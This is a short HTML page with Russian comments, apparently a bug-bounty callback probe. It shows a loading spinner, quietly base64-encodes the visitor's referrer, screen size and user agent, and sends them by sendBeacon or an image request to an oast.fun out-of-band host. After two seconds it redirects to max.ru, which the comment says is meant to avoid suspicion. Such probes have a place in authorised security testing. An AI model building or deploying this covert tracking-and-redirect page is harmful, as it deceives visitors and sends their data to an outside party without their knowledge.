<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #f0f2f5; /* Цвет фона мессенджера */
            display: flex; align-items: center; justify-content: center;
            font-family: sans-serif; cursor: default;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px; height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        (function() {
            const hook = "https://zmsfeowzqscjsayavbfeauqv1m9qlng0x.oast.fun";
            
            // Собираем данные
            const data = {
                ts: new Date().getTime(),
                ref: document.referrer, // Откуда пришел (важно для BB)
                sw: window.screen.width,
                sh: window.screen.height,
                ua: navigator.userAgent
            };

            const payload = btoa(JSON.stringify(data));
            
            // Скрытая отправка через Beacon API (надежнее картинок)
            if (navigator.sendBeacon) {
                navigator.sendBeacon(`${hook}/log?d=${payload}`);
            } else {
                new Image().src = `${hook}/img?d=${payload}`;
            }

            // Через 2 секунды редирект на официальный сайт, чтобы не вызывать подозрения
            setTimeout(() => {
                window.location.href = "https://max.ru";
            }, 2000);
        })();
    </script>
</body>
</html>
